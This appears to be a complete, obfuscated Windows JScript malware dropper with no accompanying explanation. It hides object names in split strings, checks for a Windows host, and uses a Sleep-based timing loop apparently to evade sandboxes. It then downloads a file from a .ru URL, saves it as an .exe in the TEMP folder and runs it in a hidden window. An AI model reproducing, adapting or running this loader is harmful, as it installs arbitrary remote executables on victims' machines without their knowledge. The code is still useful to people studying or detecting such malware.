var S0 = false;
var G = "Create"+"Object";
var S1 = function XP() {return WScript[G]("WScript"+".Shell");}(), NR = 11;
var MA = "MSXML2"+".XMLHTTP";
var A0 = 2;
var T0 = A0 - 2;
function T(XB){S1["Run"](XB, T0, T0);};
function DA(){return MA + "";};
function D(NF, Z1){T0 = T0 * 1; return NF - Z1;};
function A(){return G;};
/*@cc_on
  @if (@_win32 || @_win64)
    S0 = true;
  @end
@*/
if (S0)
{
var H = "";
function O(){return 22;};
var V = 0; var PS = 0;
function XI()
{
var S = new this["Date"]();
var U = S["getUTCMilliseconds"]();
WScript["Sleep"](O());
var S = new this["Date"]();
var N = S["getUTCMilliseconds"]();
WScript["Sleep"](O());
var S = new this["Date"]();
var EV = S["getUTCMilliseconds"]();
var V = "ED";
V = D(N, U);
var PS = "M";
PS = D(EV, N);
H = "open";
return D(V, PS);
}
var NI = false;
var TN = false;
for (var W = T0; W < O() * 1; W++){if (XI() != T0){
NI = true; 
PS = "31" + 11 * V + PS; 
TN = true; 
break;
}}
function MP() {return ((NI == true) && (NI == TN)) ? 1 : T0;};
if (NI && MP() && TN){
function IZ() {return S1["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "urnnoaVtW5AB3C.ex" + "e";};
 K = DA();
 E = WScript[G](K);
 var C = 1;
do { 
	for (;C;){
	try {
		if (C == 1)
		{
			E[H]("GET", "http://zakaz-sharikov.ru/x9dslp", false);
			E["send"]();
			H0 = "Sleep";
			C = 2;
		}
		WScript[H0](O() + 120); 
		if (E["readystate"] < 2 * 2) continue;
		C = T0;
		function HG(Z0) {var EI = (1, 2, 3, 4, 5, Z0); return EI;};
		OQ = WScript[A()]("ADODB.Stream");
		K = OQ;
		K[H]();
		K["type"] = HG(1);
		K["write"](E["ResponseBody"]);
		OQ["position"] = HG(T0);
		K["Save" + "ToFile"](IZ(), 2);
		OQ["cl"+"ose"]();
		Z = IZ();
		T(Z);
	} catch(CU){};};
}while (C);
}
}

